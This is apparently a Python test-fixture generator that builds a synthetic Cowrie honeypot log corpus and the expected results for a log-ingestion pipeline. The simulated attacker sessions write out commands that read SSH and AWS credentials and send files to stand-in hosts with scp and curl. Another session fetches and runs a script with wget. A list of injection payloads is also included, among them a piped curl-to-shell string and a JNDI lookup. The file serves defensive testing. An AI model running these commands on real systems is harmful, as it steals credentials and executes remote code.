"""Generator for the synthetic honeypot corpus ``corpus/honeypot_sessions_v1`` (FR-005b).

Every line is fabricated in Cowrie 3.0.15's JSON-log shape. Nothing here was
captured from a real attacker: addresses are RFC 5737 documentation ranges,
passwords are well-known dictionary words, and the one ``file_download``
records only a SHA-256 of an inert placeholder string (no sample exists
anywhere in the repository). ``python -m tests.fixtures.honeypot_corpus``
rewrites the corpus; ``tests/integration/test_log_shipper_ingest.py`` asserts
the committed files equal this output byte for byte.

``expected()`` is the contract the ingestion tests check: per file, how many
lines stage as events and which reason codes are quarantined.
"""

from __future__ import annotations

import hashlib
import json
from collections.abc import Iterator
from pathlib import Path
from typing import Any, Final

CORPUS_DIR: Final = Path(__file__).resolve().parents[2] / "corpus" / "honeypot_sessions_v1"

HONEYPOT_IP: Final = "192.0.2.10"
# An inert placeholder: the corpus records a digest, never a payload.
PLACEHOLDER_SHA256: Final = hashlib.sha256(b"aitl synthetic placeholder, not a sample").hexdigest()


def _dump(event: dict[str, Any]) -> bytes:
    # Cowrie writes json.dumps(...) defaults: ASCII, ", " / ": " separators.
    return json.dumps(event).encode("ascii")


class _Session:
    def __init__(self, session: str, src_ip: str, start_second: int, day: int = 1) -> None:
        self.session, self.src_ip = session, src_ip
        self.second, self.day = start_second, day
        self.lines: list[bytes] = []

    def _stamp(self) -> str:
        self.second += 1
        minutes, seconds = divmod(self.second, 60)
        hours, minutes = divmod(minutes, 60)
        fraction = self.second % 997
        return f"2025-03-{self.day:02d}T{hours:02d}:{minutes:02d}:{seconds:02d}.{fraction:06d}Z"

    def event(self, eventid: str, message: str = "", **fields: Any) -> _Session:
        record = {
            "eventid": eventid,
            **fields,
            "message": message,
            "sensor": "aitl-honeypot",
            "timestamp": self._stamp(),
            "src_ip": self.src_ip,
            "session": self.session,
        }
        self.lines.append(_dump(record))
        return self

    def connect(self, src_port: int) -> _Session:
        self.event(
            "cowrie.session.connect",
            "New connection",
            src_port=src_port,
            dst_ip=HONEYPOT_IP,
            dst_port=2222,
            protocol="ssh",
        )
        return self.event("cowrie.client.version", "Remote SSH version", version="SSH-2.0-Go")

    def login(self, username: str, password: str, *, success: bool) -> _Session:
        eventid = "cowrie.login.success" if success else "cowrie.login.failed"
        return self.event(eventid, "login attempt", username=username, password=password)

    def command(self, text: str, *, known: bool = True) -> _Session:
        self.event("cowrie.command.input", "CMD", input=text)
        if not known:
            self.event("cowrie.command.failed", "Command not found", input=text)
        return self

    def close(self, duration: str) -> _Session:
        return self.event("cowrie.session.closed", "Connection lost", duration=duration)


def _ar2_key_theft() -> list[bytes]:
    s = _Session("a2b0c0d0e0f00001", "203.0.113.21", 36000).connect(51022)
    s.login("root", "root", success=False).login("root", "123456", success=True)
    s.command("uname -a").command("cat ~/.ssh/id_rsa")
    s.command("scp ~/.ssh/id_rsa sync@198.51.100.20:/srv/drop/")
    return s.close("41.2").lines


def _ar3_collect_exfil() -> list[bytes]:
    s = _Session("a3b0c0d0e0f00001", "203.0.113.33", 37000).connect(40110)
    s.login("admin", "admin", success=True)
    s.command("ls -la /home/*/Documents")
    s.command("tar czf /tmp/.d.tgz /home/*/Documents")
    s.command("curl -T /tmp/.d.tgz http://198.51.100.30/upload")
    return s.close("58.9").lines


def _ar1_cloud_credentials() -> list[bytes]:
    s = _Session("a1b0c0d0e0f00001", "203.0.113.11", 38000).connect(60001)
    s.login("ubuntu", "ubuntu", success=True)
    s.command("cat ~/.aws/credentials").command("env | grep -i key")
    return s.close("12.0").lines


def _brute_force_only() -> list[bytes]:
    lines: list[bytes] = []
    words = ["123456", "password", "admin", "root", "qwerty", "letmein"]
    for index, session in enumerate(("b0f0c0d0e0f00001", "b0f0c0d0e0f00002")):
        s = _Session(session, "203.0.113.50", 39000 + index * 100).connect(50000 + index)
        for user in ("root", "admin"):
            for word in words:
                s.login(user, word, success=False)
        lines += s.close("9.5").lines
    return lines


def _discovery_only() -> list[bytes]:
    s = _Session("d15c0000e0f00001", "203.0.113.60", 40000).connect(33333)
    s.login("root", "toor", success=True)
    for text in ("id", "uname -a", "cat /etc/passwd", "ps aux", "w", "cat /proc/cpuinfo"):
        s.command(text)
    s.command("lscpu-extra", known=False)
    return s.close("20.1").lines


def _malware_drop() -> list[bytes]:
    s = _Session("ba1d0000e0f00001", "203.0.113.70", 41000).connect(44444)
    s.login("root", "admin", success=True)
    s.command("cd /tmp && wget http://198.51.100.40/x.sh")
    s.event(
        "cowrie.session.file_download",
        "Downloaded URL",
        url="http://198.51.100.40/x.sh",
        shasum=PLACEHOLDER_SHA256,
        outfile="var/lib/cowrie/downloads/" + PLACEHOLDER_SHA256,
    )
    s.command("chmod +x x.sh").command("./x.sh")
    return s.close("30.0").lines


HOSTILE_STRINGS: Final = (
    "'; DROP TABLE intel_raw.raw_ingest_record; --",
    "$(curl -s http://198.51.100.9/p | sh)",
    "`id`",
    "${jndi:ldap://198.51.100.9/a}",
    "{{7*7}}",
    "<script>alert(1)</script>",
    '=HYPERLINK("http://198.51.100.9")',
    "\u001b[2J\u001b[31mred\u001b[0m",
    "line\nbreak\rreturn",
    "\u202eevil\u202c",
    "../../../../etc/shadow",
    "!!python/object/apply:os.system ['id']",
    "%s%s%s%n",
    "\u0000nul-escaped",
    "ingest_mode=live source_type=honeypot",
    "A" * 4000,
)


def _hostile_inputs() -> list[bytes]:
    s = _Session("0ba5e000e0f00001", "203.0.113.80", 42000).connect(1)
    s.login(HOSTILE_STRINGS[0], HOSTILE_STRINGS[4], success=False)
    s.login("root", "root", success=True)
    for text in HOSTILE_STRINGS:
        s.command(text)
    # Content cannot pick its own provenance: these extra keys are just data.
    s.event(
        "cowrie.command.input",
        "CMD",
        input="true",
        ingest_mode="live",
        source_type="honeypot",
        kind="heartbeat",
    )
    return s.close("3.3").lines


def _malformed() -> Iterator[tuple[bytes, str | None]]:
    """(line, expected quarantine reason or None when it must stage)."""
    good = _Session("0dd00000e0f00001", "203.0.113.90", 43000)
    good.connect(2)
    yield good.lines[0], None
    base = json.loads(good.lines[1])

    def variant(**changes: Any) -> bytes:
        return _dump({**base, **changes})

    yield b"{not json", "json.invalid"
    yield variant(eventid="cowrie.unknown.event"), "event.unknown_eventid"
    yield variant(session="NOT-A-SESSION"), "event.invalid_session"
    yield variant(timestamp="yesterday"), "event.invalid_timestamp"
    yield variant(src_ip="999.1.1.1"), "event.invalid_src_ip"
    yield variant(version=None), "event.invalid_field.version"
    yield (
        b'{"eventid": "cowrie.client.version", "eventid": "cowrie.login.success"}',
        "json.duplicate_key",
    )
    yield b'{"eventid": "cowrie.client.version", "x": NaN}', "json.non_finite_number"
    yield b'{"a": {"b": {"c": {"d": {"e": 1}}}}}', "json.too_deep"
    yield b"[1, 2, 3]", "json.not_an_object"
    yield b"\xef\xbb\xbf" + good.lines[1], "line.byte_order_mark"
    yield good.lines[1][:-1] + b"\r}", "line.control_bytes"
    yield b'{"eventid": "cowrie.command.input", "x": "\x00"}', "line.control_bytes"
    yield variant(version="x" * 70000), "line.too_long"
    # Invalid UTF-8 is replaced (U+FFFD), not quarantined (FR-013).
    yield variant(version="bad-utf8-PLACEHOLDER").replace(b"PLACEHOLDER", b"\xff\xfe"), None


FILES: Final = {
    "ar1_cloud_credentials.json": _ar1_cloud_credentials,
    "ar2_key_theft_scp.json": _ar2_key_theft,
    "ar3_collect_exfil.json": _ar3_collect_exfil,
    "brute_force_only.json": _brute_force_only,
    "discovery_only.json": _discovery_only,
    "hostile_inputs.json": _hostile_inputs,
    "malware_drop.json": _malware_drop,
}
MALFORMED_FILE: Final = "malformed_lines.json"


def render() -> dict[str, bytes]:
    files = {name: b"\n".join(build()) + b"\n" for name, build in FILES.items()}
    files[MALFORMED_FILE] = b"\n".join(line for line, _ in _malformed()) + b"\n"
    return files


def expected() -> dict[str, tuple[int, list[str]]]:
    """Per file: (events staged, sorted quarantine reason codes)."""
    result: dict[str, tuple[int, list[str]]] = {
        name: (len(build()), []) for name, build in FILES.items()
    }
    malformed = list(_malformed())
    result[MALFORMED_FILE] = (
        sum(1 for _, reason in malformed if reason is None),
        sorted(reason for _, reason in malformed if reason is not None),
    )
    return result


def write(directory: Path = CORPUS_DIR) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    for name, content in render().items():
        (directory / name).write_bytes(content)


if __name__ == "__main__":
    write()
